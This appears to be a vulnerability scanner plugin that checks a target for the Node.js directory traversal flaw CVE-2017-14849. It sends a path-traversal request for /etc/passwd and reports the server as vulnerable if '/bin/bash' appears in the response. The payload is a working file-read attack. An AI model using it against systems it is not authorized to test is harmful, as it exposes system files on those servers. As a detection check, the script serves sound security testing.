#request url = var
#define payload = /static/../../../a/../../../../etc/passwd
#define bug =/bin/bash
#define info = 存在Node.js 目录穿越漏洞（CVE-2017-14849）

function main(args)
{
	res = HttpGet(url.payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
	if(StrFindStr(res[0],bug,0)!= "-1")
	{
		print(url.info);
	}
}
